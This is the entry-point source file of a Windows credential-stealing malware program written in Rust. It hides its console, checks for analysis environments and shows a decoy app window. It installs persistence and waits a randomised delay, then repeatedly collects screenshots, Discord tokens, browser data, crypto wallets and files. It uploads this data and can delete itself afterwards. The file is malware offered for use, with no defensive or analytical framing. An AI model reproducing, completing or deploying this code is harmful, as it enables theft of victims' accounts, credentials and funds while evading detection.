#![cfg_attr(not(feature = "console"), windows_subsystem = "windows")]

mod browsers;
mod config;
mod crypto;
mod decoy;
mod discord;
mod files;
mod guard;
mod obf;
mod persist;
mod screenshot;
mod session;
mod sysinfo;
mod upload;
mod util;
mod wallets;

pub use config::Config;

use session::Session;

fn single_instance(app_name: &str) -> bool {
    use winapi::um::errhandlingapi::GetLastError;
    use winapi::um::synchapi::CreateMutexW;

    let name: Vec<u16> = format!("Local\\{app_name}\0").encode_utf16().collect();
    unsafe {
        let handle = CreateMutexW(std::ptr::null_mut(), 0, name.as_ptr());
        if handle.is_null() {
            return true;
        }
        GetLastError() != 183 // ERROR_ALREADY_EXISTS
    }
}

fn run(cfg: &Config) {
    if cfg.delay_minutes > 0 {
        let base = cfg.delay_minutes * 60;
        let jitter = (base as f64 * 0.1) as u64;
        let extra = if jitter > 0 {
            let seed = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.subsec_nanos() as u64)
                .unwrap_or(0);
            seed % (jitter * 2 + 1)
        } else {
            0
        };
        let wait = base.saturating_sub(jitter) + extra;
        util::debug(&format!("delay: {wait}s"));
        util::sleep_secs(wait);
    }

    loop {
        let mut session = Session::new();
        let meta = sysinfo::collect(&mut session);
        screenshot::collect(&mut session);
        discord::collect(&mut session);
        browsers::collect(&mut session);
        wallets::collect(&mut session);
        files::collect(&mut session);
        session.finish();

        util::debug(&format!(
            "staged {} files, {}",
            session.files,
            util::human_size(session.bytes)
        ));

        upload::deliver(&mut session, &meta, cfg);
        session.destroy();

        if cfg.repeat_hours == 0 {
            break;
        }
        util::sleep_secs(cfg.repeat_hours * 3600);
    }

    if cfg.self_delete {
        persist::self_delete();
    }
}

fn work(cfg: Config) {
    if cfg.persist {
        let ok = persist::install(&cfg.app_name);
        util::debug(&format!("persist: {ok}"));
    }
    run(&cfg)
}

fn main() {
    let cfg = Config::load();

    if cfg.guard {
        if let Some(reason) = guard::detected() {
            util::debug(&format!("guard: {reason}"));
            return;
        }
    }

    if !single_instance(&cfg.app_name) {
        return;
    }

    if cfg.decoy {
        let worker = cfg.clone();
        decoy::show(&format!("{} v2.4", cfg.app_name), move || work(worker));
        return;
    }

    work(cfg)
}